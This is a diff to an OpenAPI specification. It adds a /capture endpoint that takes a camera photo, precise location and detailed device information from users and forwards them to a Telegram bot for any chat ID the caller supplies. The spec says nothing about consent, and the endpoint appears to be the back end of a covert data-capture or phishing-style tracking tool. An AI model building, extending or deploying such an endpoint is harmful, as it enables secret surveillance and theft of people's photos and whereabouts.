@@ -10,6 +10,8 @@ servers:
 tags:
   - name: health
     description: Health operations
+  - name: capture
+    description: User data capture operations
 paths:
   /healthz:
     get:
@@ -24,6 +26,37 @@ paths:
             application/json:
               schema:
                 $ref: "#/components/schemas/HealthStatus"
+  /capture:
+    post:
+      operationId: submitCapture
+      tags: [capture]
+      summary: Submit captured user data to Telegram bot
+      description: Receives camera photo, location, and device info and sends it to the Telegram bot for the given chat_id
+      requestBody:
+        required: true
+        content:
+          application/json:
+            schema:
+              $ref: "#/components/schemas/CaptureData"
+      responses:
+        "200":
+          description: Data sent successfully
+          content:
+            application/json:
+              schema:
+                $ref: "#/components/schemas/CaptureResult"
+        "400":
+          description: Bad request
+          content:
+            application/json:
+              schema:
+                $ref: "#/components/schemas/ErrorResponse"
+        "500":
+          description: Server error
+          content:
+            application/json:
+              schema:
+                $ref: "#/components/schemas/ErrorResponse"
 components:
   schemas:
     HealthStatus:
@@ -33,4 +66,66 @@ components:
           type: string
       required:
         - status
-
+    CaptureData:
+      type: object
+      required:
+        - chatId
+      properties:
+        chatId:
+          type: string
+          description: Telegram chat ID to send data to
+        photo:
+          type: ["string", "null"]
+          description: Base64 encoded photo from camera (data URL)
+        location:
+          $ref: "#/components/schemas/LocationData"
+        deviceInfo:
+          $ref: "#/components/schemas/DeviceInfo"
+    LocationData:
+      type: object
+      properties:
+        latitude:
+          type: number
+        longitude:
+          type: number
+        accuracy:
+          type: ["number", "null"]
+        city:
+          type: ["string", "null"]
+    DeviceInfo:
+      type: object
+      properties:
+        userAgent:
+          type: string
+        platform:
+          type: string
+        screenWidth:
+          type: number
+        screenHeight:
+          type: number
+        language:
+          type: string
+        timezone:
+          type: string
+        battery:
+          type: ["number", "null"]
+          description: Battery level 0-100
+        connectionType:
+          type: ["string", "null"]
+    CaptureResult:
+      type: object
+      required:
+        - success
+        - message
+      properties:
+        success:
+          type: boolean
+        message:
+          type: string
+    ErrorResponse:
+      type: object
+      required:
+        - error
+      properties:
+        error:
+          type: string
